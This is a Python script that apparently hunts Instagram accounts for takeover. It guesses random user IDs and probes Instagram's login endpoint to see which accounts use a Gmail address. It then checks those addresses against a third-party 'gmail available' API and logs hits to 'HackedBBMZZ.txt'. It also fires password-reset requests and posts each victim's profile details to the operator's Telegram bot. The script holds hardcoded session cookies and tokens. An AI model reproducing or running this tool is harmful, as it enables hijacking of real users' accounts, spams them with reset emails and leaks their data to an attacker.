import requests 
import time
import threading
import secrets
import os
import random
import sys
import datetime
from user_agent import generate_user_agent
vi = sys.version
print(vi)
class Gmail:
    def __init__(self) -> None:
        self.ok = 0
        self.bad = 0
        self.bad1 = 0
        self.error = 0
        self.wile = True
        self.acctive = 0
        self.j =0
        self.ri = 1
        self.red = 2
        self.blo = 3
        self.clor ='\033[1;'
        self.day = datetime.date.today()
        self.mun()
    def mun(self):
        os.system('cls' if os.name =='nt'else'clear')
        self.listmun = "{}3{}m\n[1] - Checker Gmail List\n[2] - Remove File Name\n[3] - Username 2010 - 2011 - 2012\n[=] - Version Tool 0.1".format(self.clor,self.red)
        print(self.listmun)
        self.input1()

    def input1(self):
        self.inp = input('{}3{}m[=] - Enter Your Choice : '.format(self.clor,self.blo))
        if self.inp == '1':
            os.system('cls' if os.name =='nt'else'clear')
            self.filname()
        elif self.inp == '2':
            os.system('cls' if os.name =='nt'else'clear')
            self.delt()
        elif self.inp == '3':
            os.system('cls' if os.name =='nt'else'clear')
            self.i2 = "[1] - Check and Check 2010\n[2] - Check and Check 2010 2011\n[3] - Check and Check 2012"
            print(self.i2)
            self.i3 = input('[=] - Enter Your : ').lower()
            self.listnumber ='1234567890'
            if self.i3 == "1":
                os.system('cls' if os.name =='nt'else'clear')
                self.i4 = 6
                self.ch()
            elif self.i3 =='2':
                os.system('cls' if os.name =='nt'else'clear')
                self.i4 = 7
                self.ch()
            elif self.i3 == "3":
                os.system('cls' if os.name =='nt'else'clear')
                self.i4 = 8
                self.ch()

        else:
            os.system('cls' if os.name =='nt'else'clear')
            self.err= "Error Choice - !"
            print(self.err)
    def ch(self):
        self.token = input('[=] - Enter Your Token : ')
        self.ido = input('[=] - Enter Your ID Accouint : ')
        while self.wile:
            try:

                self.csrftoken = secrets.token_hex(32)
                self.mmidd=secrets.token_hex(27)
                self.ig_=secrets.token_hex(36)
                self.datrr=secrets.token_hex(24)
                self.faker = generate_user_agent()
                self.fak = generate_user_agent()
                self.app=''.join(random.choice('936619743392459')for i in range(15))
                self.cookies = {
                    'csrftoken': self.csrftoken,
                    'ps_l': '0',
                    'ps_n': '0',
                    'ig_did': f'{self.ig_}',
                    'ig_nrcb': '1',
                    'dpr': '2.1988937854766846',
                    'mid': self.mmidd,
                    'datr': self.datrr,
                }
                self.headers11= {
                    'authority': 'www.instagram.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    # 'cookie': 'csrftoken=GpSFJXM8cw5Ridi72oRh18; ps_l=0; ps_n=0; ig_did=BFD5A6E1-D993-48EE-914E-A6A5A2CC8D6D; ig_nrcb=1; dpr=2.1988937854766846; mid=ZhLiHgAEAAE63kJS7yz7sG6sp5mw; datr=HuISZrdPWEfDXxhdMTlBClqV',
                    'dpr': '2.19889',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/a_1_in/?igsh=czFtZ3o1aDhraG01',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-ch-ua-platform-version': '""',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': self.fak,
                    'viewport-width': '891',
                    'x-asbd-id': '129477',
                    'x-csrftoken': self.csrftoken,
                    'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
                    'x-fb-lsd': 'AVoRhvRPoRs',
                    'x-ig-app-id': self.app,
                }
                self.cho = str(''.join(random.choice(self.listnumber)for i in range(self.i4)))
                self.data11 = {
                    'av': '0',
                    '__d': 'www',
                    '__user': '0',
                    '__a': '1',
                    '__req': '1',
                    '__hs': '19820.HYP:instagram_web_pkg.2.1..0.0',
                    'dpr': '2',
                    '__ccg': 'UNKNOWN',
                    '__rev': '1012604142',
                    '__s': 'dmjo05:l5d6wo:20s0u7',
                    '__hsi': '7355192092986103751',
                    '__dyn': '7xeUjG1mxu1syUbFp40NonwgU29zEdF8aUco2qwJw5ux609vCwjE1xoswaq0yE7i0n24oaEd86a3a1YwBgao6C0Mo2swaO4U2zxe2GewGwso88cobEaU2eUlwhEe87q7U88138bpEbUGdwtU662O0Lo6-3u2WE5B0bK1Iwqo5q1IQp1yUoxe4UrAwCAxW6U',
                    'csr': 'gVb2snsIjkIQyjRmBaFGECih59Fb98nQBzbZ2IN8BqBGl7h9Am4ohAAD-vGBh4GizA-4aAiJ2vFDUR3qx596AhrBgzJlBKmu6VHiypryUkByrGiicgPAx6iUpGEOmqfykFA4801kXEkOwmU1Tqwvk8wCix64E0b_EaWdguwozat2F61-wiokxG0d9w2MFU5Kzo0k6wiU7Kut2F601_Ew1me','comet_req': '7','lsd': 'AVoRhvRPoRs',
                    'jazoest': '21036',
                    '__spin_r': '1012604142',
                    '__spin_b': 'trunk',
                    '__spin_t': '1712514108',
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                    'variables': '{"id":"'+self.cho+'","relay_header":false,"render_surface":"PROFILE"}',
                    'server_timestamps': 'true',
                    'doc_id': '7381344031985950',
                }
                response = requests.post('https://www.instagram.com/api/graphql', cookies=self.cookies, headers=self.headers11, data=self.data11).json()
                self.rr = response['data']['user']['username']
                self.url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
                self.headers ={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-length': '291',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                
                        'user-agent': '{}'.format(generate_user_agent()),
                        'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': '0',
                        'x-instagram-ajax': '1007230059',
                        'x-requested-with': 'XMLHttpRequest'
                }
                self.tim = str(time.time()).split('.')[0]
                self.data ={
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{self.tim}:zaidgzikbbmzz',
                    'username': f'{self.rr}@gmail.com',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false',
                    'trustedDeviceRecords': '{}'

                }
                try:
                    try:
                        self.rf = requests.post(self.url,headers=self.headers,data=self.data).text
                        if ('"Sorry, your password was incorrect. Please double-check your password."') in self.rf:
                            os.system('cls' if os.name =='nt'else'clear')
                            self.bad +=1
                            print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))
                            
                        
                        elif ('"user":true,') in self.rf:
                            self.req = requests.get(f'https://api-check-cc49f9ebb784.herokuapp.com/qredes/gmail/?email={self.email}@gmail.com').text
                        
                            if ('"status":"good"') in self.req:
                                with open('HackedBBMZZ.txt','a') as f8:
                                        f8.write(f'{self.email}\n')
                            
                                #os.system('cls' if os.name =='nt'else'clear')
                                self.ok +=1
                        
                                #print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))
                                
                                self.url1 ='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.email)
                                self.head1 = {
                                    'accept': '*/*',
                                    'accept-encoding': 'gzip, deflate, br',
                                    'accept-language': 'en-US,en;q=0.9',
                                    'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                                    'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                                    'sec-ch-prefers-color-scheme': 'light',
                                    'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                                    'sec-ch-ua-mobile': '?0',
                                    'sec-ch-ua-platform': '"Windows"',
                                    'sec-fetch-dest': 'empty',
                                    'sec-fetch-mode': 'cors',
                                    'sec-fetch-site': 'same-origin',
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                    'x-ig-app-id': '936619743392459',
                                    'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                                    'x-instagram-ajax': '1006627630',
                                    'x-requested-with': 'XMLHttpRequest'
                                
                                }
                                try:
                                    try:
                                        
                                        ge = requests.get(self.url1,headers=self.head1).json()
                                    except requests.exceptions.ReadTimeout as error:
                                        continue
                                except requests.exceptions.ConnectionError as error:
                                    continue
                                try:

                                    id = ge['data']['user']['id']
                                    fol = ge['data']['user']['edge_followed_by']['count']
                                    bio = ge['data']['user']['biography']
                                    fols = ge['data']['user']['edge_follow']['count']
                                    img = ge['data']['user']['profile_pic_url']
                                    nam = ge['data']['user']['full_name']
                                    os.system('cls'if os.name=='nt'else'clear')
                        
                                    rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                            
                                    ree = rl.json()
                                    da = ree['date']
                                    headers1 = {
                    # 'Content-Length': '305',
                                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                        'viewport-width': '917',
                                        'x-asbd-id': '198387',
                                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                    }
                                    data3 = {
                                        'ig_sig_key_version': '4',
                                        "user_id":id
                                    }
                                    try:
                                        try:
                                            
                                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                        except requests.exceptions.ReadTimeout as errro1:
                                            continue
                                        try:
                                            rs =str(res['obfuscated_email'])
                                        except KeyError as error:
                                            continue
                                    except requests.exceptions.ConnectionError as error:
                                        continue
                                    self.j+=1
                                    try:
                                        try:
                                            
                    
                                            try:
                                                lm = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : {rs}\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                                tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm}')
                                                ru= requests.post(tlg)
                                                
                                            except UnboundLocalError as error:
                                                lm1 = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : Error\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                                tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm1}')
                                                ru= requests.post(tlg)
                                        except requests.exceptions.ReadTimeout as erp:
                                            continue
                                    except requests.exceptions.ConnectionError as error:
                                        continue
                                except KeyError as error:
                                    with open('HackedBBMZZ.txt','a') as f8:
                                        f8.write(f'{self.email}\n')
                                    os.system('cls' if os.name =='nt'else'clear')
                                    self.ok +=1
                                    print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))

                            else:
                                os.system('cls' if os.name =='nt'else'clear')
                                self.bad1 +=1
                                print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))

                    except requests.exceptions.ConnectionError as error:
                        continue
            
                except Exception as error:
                    continue


            except:
            
                self.ch()
    


            
        
    def filname(self):
        os.system('cls' if os.name =='nt'else'clear')

        self.filname1 = input('[=] - Enter Your File Name : ')
        try:
            self.op = open(self.filname1,'r').read().splitlines()
            self.token1()
        except FileNotFoundError as error:
            os.system('cls' if os.name =='nt'else'clear')
            self.error12 = '{}3{}mError File Name in Phone .!'.format(self.clor,self.ri)
            print(self.error12)
    def token1(self):
        os.system('cls' if os.name =='nt'else'clear')
        print(self.filname1,"      True In Phone {}3{}m\n".format(self.clor,self.blo))
        self.token = input('[=] - Enter Your Token Bot : ')
        self.ido = input('[=] - Enter Your ID Telegram : ')
        self.for1()
    def delt(self):
        os.system('cls' if os.name =='nt'else'clear')
        self.namefile = input('[=] - Enter Your File Name Remove : ')
        try:
            os.remove(self.namefile)
            self.r1 = 'File True Remove'
            print(self.r1)
        except FileNotFoundError as er:
            os.system('cls' if os.name =='nt'else'clear')
            print('The File No In Phone .')
            sys.exit()

        
    def for1(self):
        for self.email in self.op:
            if ("@") in self.email : 
                self.email = self.email.split("@")[0]
                self.email = self.email
            else:
                self.email = self.email
            self.url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
            self.headers ={
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
            
                    'user-agent': '{}'.format(generate_user_agent()),
                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1007230059',
                    'x-requested-with': 'XMLHttpRequest'
            }
            self.tim = str(time.time()).split('.')[0]
            self.data ={
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{self.tim}:zaidgzikbbmzz',
                'username': f'{self.email}@gmail.com',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'

            }
            try:
                try:
                    self.rf = requests.post(self.url,headers=self.headers,data=self.data).text
                    if ('"Sorry, your password was incorrect. Please double-check your password."') in self.rf:
                        os.system('cls' if os.name =='nt'else'clear')
                        self.bad +=1
                        print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))
                        
                    
                    elif ('"user":true,') in self.rf:
                        self.req = requests.get(f'https://api-check-cc49f9ebb784.herokuapp.com/qredes/gmail/?email={self.email}@gmail.com').text
                       
                        if ('"status":"good"') in self.req:
                            with open('HackedBBMZZ.txt','a') as f8:
                                    f8.write(f'{self.email}\n')
                           
                            #os.system('cls' if os.name =='nt'else'clear')
                            self.ok +=1
                       
                            #print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))
                            
                            self.url1 ='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.email)
                            self.head1 = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9',
                                'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                                'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                                'sec-ch-prefers-color-scheme': 'light',
                                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                'x-ig-app-id': '936619743392459',
                                'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                                'x-instagram-ajax': '1006627630',
                                'x-requested-with': 'XMLHttpRequest'
                            
                            }
                            try:
                                try:
                                    
                                    ge = requests.get(self.url1,headers=self.head1).json()
                                except requests.exceptions.ReadTimeout as error:
                                    continue
                            except requests.exceptions.ConnectionError as error:
                                continue
                            try:

                                id = ge['data']['user']['id']
                                fol = ge['data']['user']['edge_followed_by']['count']
                                bio = ge['data']['user']['biography']
                                fols = ge['data']['user']['edge_follow']['count']
                                img = ge['data']['user']['profile_pic_url']
                                nam = ge['data']['user']['full_name']
                                os.system('cls'if os.name=='nt'else'clear')
                       
                                rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                           
                                ree = rl.json()
                                da = ree['date']
                                headers1 = {
                # 'Content-Length': '305',
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                }
                                data3 = {
                                    'ig_sig_key_version': '4',
                                    "user_id":id
                                }
                                try:
                                    try:
                                        
                                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                    except requests.exceptions.ReadTimeout as errro1:
                                        continue
                                    try:
                                        rs =str(res['obfuscated_email'])
                                    except KeyError as error:
                                        continue
                                except requests.exceptions.ConnectionError as error:
                                    continue
                                self.j+=1
                                try:
                                    try:
                                        
                
                                        try:
                                            lm = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : {rs}\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                            tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm}')
                                            ru= requests.post(tlg)
                                            
                                        except UnboundLocalError as error:
                                            lm1 = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : Error\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                            tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm1}')
                                            ru= requests.post(tlg)
                                    except requests.exceptions.ReadTimeout as erp:
                                        continue
                                except requests.exceptions.ConnectionError as error:
                                    continue
                            except KeyError as error:
                                with open('HackedBBMZZ.txt','a') as f8:
                                    f8.write(f'{self.email}\n')
                                os.system('cls' if os.name =='nt'else'clear')
                                self.ok +=1
                                print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))

                        else:
                            os.system('cls' if os.name =='nt'else'clear')
                            self.bad1 +=1
                            print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))

                except requests.exceptions.ConnectionError as error:
                    continue
           
            except Exception as error:
                continue




Gmail()
